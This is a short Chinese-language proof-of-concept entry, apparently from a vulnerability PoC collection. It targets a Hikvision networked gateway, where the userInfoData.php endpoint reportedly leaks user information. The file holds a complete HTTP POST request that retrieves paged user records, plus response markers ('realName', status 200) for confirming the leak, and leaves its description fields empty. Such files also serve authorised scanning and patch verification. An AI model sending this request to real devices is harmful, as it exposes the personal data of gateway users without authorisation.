﻿# HIKVISION 联网网关userInfoData.php 接口处敏感信息泄露漏洞

> 更新时间：2024-04-07

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /data/userInfoData.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Te: trailers
X-Requested-With: XMLHttpRequest
Connection: close

page=1&rows=20&sort=userId&order=asc
```

> 响应代码特征：200

> 响应内容特征：realName

> 上传文件定位：

> 验证文件来源：HIKVISION 联网网关userInfoData.php 接口处敏感信息泄露漏洞.poc

